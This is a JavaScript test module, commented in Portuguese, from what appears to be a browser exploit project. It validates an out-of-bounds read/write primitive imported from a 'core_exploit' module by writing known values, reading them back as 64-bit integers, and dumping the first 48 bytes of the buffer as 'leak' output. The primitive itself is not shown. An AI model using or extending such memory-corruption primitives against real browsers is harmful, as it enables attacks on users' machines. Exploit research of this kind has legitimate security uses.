// js/script3/testOOBReadValidation.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // Importado para referência de tamanho, mas as leituras/escritas usam as funções
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs'; // Não usado diretamente aqui, mas bom para consistência

export async function executeValidateReadPrimitiveAndDumpStartTest() {
    const FNAME_TEST = "executeValidateReadPrimitiveAndDumpStartTest";
    logS3(`--- Iniciando Teste: Validação de Leitura OOB e Dump Inicial do Buffer ---`, "test", FNAME_TEST);
    document.title = `OOBReadVal & Dump Initial`;

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }
    logS3(`oob_array_buffer_real configurado. Tamanho total: ${oob_array_buffer_real.byteLength} bytes.`, "info", FNAME_TEST);
    await PAUSE_S3();

    // Passo 1: Verificar a primitiva oob_read_absolute(offset, 8) com dados conhecidos
    logS3("--- Passo 1: Validando oob_read_absolute(offset, 8) ---", "subtest", FNAME_TEST);
    const test_offset_rw = 0x08; // Usar um offset pequeno mas não zero
    const val_low_part = 0x11223344;
    const val_high_part = 0xAABBCCDD;

    try {
        logS3(`Escrevendo 0x${val_low_part.toString(16)} em offset ${toHex(test_offset_rw)} (4 bytes)`, "info", FNAME_TEST);
        oob_write_absolute(test_offset_rw, val_low_part, 4);
        logS3(`Escrevendo 0x${val_high_part.toString(16)} em offset ${toHex(test_offset_rw + 4)} (4 bytes)`, "info", FNAME_TEST);
        oob_write_absolute(test_offset_rw + 4, val_high_part, 4);

        await PAUSE_S3();
        logS3(`Lendo 8 bytes de offset ${toHex(test_offset_rw)}...`, "info", FNAME_TEST);
        const read_qword_val = oob_read_absolute(test_offset_rw, 8);

        if (isAdvancedInt64Object(read_qword_val)) {
            logS3(`   Valor QWORD lido: ${read_qword_val.toString(true)} (Low: ${toHex(read_qword_val.low())}, High: ${toHex(read_qword_val.high())})`, "leak", FNAME_TEST);
            if (read_qword_val.low() === val_low_part && read_qword_val.high() === val_high_part) {
                logS3("   SUCESSO: Leitura de 8 bytes e composição em AdvancedInt64 CORRETA!", "good", FNAME_TEST);
            } else {
                logS3(`   FALHA: Valor lido (Low: ${toHex(read_qword_val.low())}, High: ${toHex(read_qword_val.high())}) diferente do esperado (Low: ${toHex(val_low_part)}, High: ${toHex(val_high_part)})`, "error", FNAME_TEST);
            }
        } else {
            logS3(`   FALHA: oob_read_absolute(offset, 8) não retornou um AdvancedInt64. Retornou: ${typeof read_qword_val}`, "error", FNAME_TEST);
        }
    } catch (e) {
        logS3(`Erro durante validação de R/W de 8 bytes: ${e.message}`, "error", FNAME_TEST);
        console.error("Erro validação R/W 8 bytes:", e);
    }
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Passo 2: Dump dos primeiros bytes do oob_array_buffer_real
    logS3("--- Passo 2: Dump dos primeiros 48 bytes do oob_array_buffer_real (lendo como QWORDs) ---", "subtest", FNAME_TEST);
    const dump_end_offset = Math.min(0x30, oob_array_buffer_real.byteLength); // Ler até 0x30 (48 bytes) ou fim do buffer

    for (let current_offset = 0; current_offset < dump_end_offset; current_offset += 8) {
        if (current_offset + 8 > oob_array_buffer_real.byteLength) {
            logS3(`   Não é possível ler 8 bytes completos em ${toHex(current_offset)}, pulando para o fim do dump.`, "info", FNAME_TEST);
            break;
        }
        try {
            const val = oob_read_absolute(current_offset, 8);
            if (isAdvancedInt64Object(val)) {
                logS3(`   Offset ${toHex(current_offset)} - ${toHex(current_offset + 7)}: ${val.toString(true)} (L: ${toHex(val.low())} H: ${toHex(val.high())})`, "leak", FNAME_TEST);
            } else {
                logS3(`   Offset ${toHex(current_offset)}: Leitura de 8 bytes não retornou AdvancedInt64.`, "warn", FNAME_TEST);
            }
        } catch (e) {
            logS3(`   Erro ao ler 8 bytes do offset ${toHex(current_offset)}: ${e.message}`, "error", FNAME_TEST);
        }
        if (current_offset < dump_end_offset - 8) { // Evita pausa desnecessária no final
             await PAUSE_S3(5); // Pequena pausa para não sobrecarregar o log de uma vez
        }
    }

    logS3(`--- Teste Validação de Leitura OOB e Dump Inicial CONCLUÍDO ---`, "test", FNAME_TEST);
    document.title = `OOBReadVal & Dump Done`;
    clearOOBEnvironment();
}
